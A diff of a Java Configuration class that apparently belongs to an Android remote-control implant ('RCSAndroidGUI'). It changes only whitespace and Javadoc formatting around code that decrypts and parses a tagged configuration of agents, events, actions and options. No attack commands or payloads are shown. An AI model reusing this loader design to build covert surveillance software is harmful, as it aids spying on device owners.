@@ -28,7 +28,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class Configuration.
  */
 public class Configuration {
-	
+
 	/** The status obj. */
 	private final Status statusObj;
 
@@ -40,12 +40,15 @@ public class Configuration {
 	/** Clear configuration buffer wrapped into a ByteBuffer. */
 	private ByteBuffer wrappedClearConf;
 
-	/** Configuration file tags (ASCII format, NULL-terminated in binary configuration). */
+	/**
+	 * Configuration file tags (ASCII format, NULL-terminated in binary
+	 * configuration).
+	 */
 	public static final String AGENT_CONF_DELIMITER = "AGENTCONFS-";
-	
+
 	/** The Constant EVENT_CONF_DELIMITER. */
 	public static final String EVENT_CONF_DELIMITER = "EVENTCONFS-";
-	
+
 	/** The Constant MOBIL_CONF_DELIMITER. */
 	public static final String MOBIL_CONF_DELIMITER = "MOBILCONFS-";
 
@@ -54,10 +57,10 @@ public class Configuration {
 
 	/** The Constant NEW_CONF. */
 	public static final String NEW_CONF = "1";
-	
+
 	/** The Constant ACTUAL_CONF. */
 	public static final String ACTUAL_CONF = "2";;
-	
+
 	/** The Constant FORCED_CONF. */
 	private static final String FORCED_CONF = "3";
 
@@ -66,8 +69,9 @@ public class Configuration {
 
 	/**
 	 * Instantiates a new configuration.
-	 *
-	 * @param resource the resource
+	 * 
+	 * @param resource
+	 *            the resource
 	 */
 	public Configuration(final byte[] resource) {
 		statusObj = Status.self();
@@ -76,9 +80,10 @@ public class Configuration {
 
 	/**
 	 * Load configuration.
-	 *
+	 * 
 	 * @return true, if successful
-	 * @throws RCSException the rCS exception
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	public boolean LoadConfiguration() throws RCSException {
 		try {
@@ -99,8 +104,9 @@ public class Configuration {
 
 	/**
 	 * Parses the configuration.
-	 *
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void parseConfiguration() throws RCSException {
 		try {
@@ -125,11 +131,14 @@ public class Configuration {
 
 	/**
 	 * Crc.
-	 *
-	 * @param buffer : input buffer
-	 * @param offset : offset
-	 * @param len : length of data into the buffer (buffer can be larger than
-	 * data)
+	 * 
+	 * @param buffer
+	 *            : input buffer
+	 * @param offset
+	 *            : offset
+	 * @param len
+	 *            : length of data into the buffer (buffer can be larger than
+	 *            data)
 	 * @return the int
 	 */
 	private int crc(final byte[] buffer, final int offset, final int len) {
@@ -160,10 +169,12 @@ public class Configuration {
 
 	/**
 	 * Return the index at witch tag begins.
-	 *
-	 * @param tag string
+	 * 
+	 * @param tag
+	 *            string
 	 * @return the offset where the tag ends
-	 * @throws RCSException the rCS exception
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private int findTag(final String tag) throws RCSException {
 		final int index = Utils.getIndex(wrappedClearConf.array(), tag
@@ -179,8 +190,9 @@ public class Configuration {
 
 	/**
 	 * Parses configuration file and loads the agents into Status.
-	 *
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void loadAgents() throws RCSException {
 		int agentTag;
@@ -223,8 +235,9 @@ public class Configuration {
 
 	/**
 	 * Parses configuration file and loads the events into Status.
-	 *
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void loadEvents() throws RCSException {
 		int eventTag;
@@ -271,8 +284,9 @@ public class Configuration {
 	 */
 	/**
 	 * Load actions.
-	 *
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void loadActions() throws RCSException {
 		final int actionNum = wrappedClearConf.getInt();
@@ -314,8 +328,9 @@ public class Configuration {
 
 	/**
 	 * Load options.
-	 *
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void loadOptions() throws RCSException {
 		int optionsTag;
@@ -356,9 +371,11 @@ public class Configuration {
 
 	/**
 	 * Decrypt configuration.
-	 *
-	 * @param rawConf the raw conf
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @param rawConf
+	 *            the raw conf
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	private void decryptConfiguration(final byte[] rawConf) throws RCSException {
 		/**
